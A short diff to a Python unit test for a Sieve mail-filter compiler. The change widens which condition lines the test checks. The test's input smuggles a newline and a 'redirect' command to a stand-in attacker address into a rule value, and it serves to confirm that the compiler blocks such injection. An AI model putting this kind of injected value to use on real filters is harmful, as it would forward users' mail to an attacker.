@@ -485,7 +485,7 @@ class SieveCompilationTest(TestCase):
         rule = self.rule(value='x\nredirect "attacker@evil.test";')
         script = compile_rules([rule], None, valid_folders={"News"})
 
-        condition = [l for l in script.body.splitlines() if l.startswith("if header")]
+        condition = [l for l in script.body.splitlines() if l.startswith(("if header", "if address"))]
         self.assertEqual(1, len(condition), "the value broke the statement apart")
         self.assertNotIn("\n", condition[0])
         for line in script.body.splitlines():
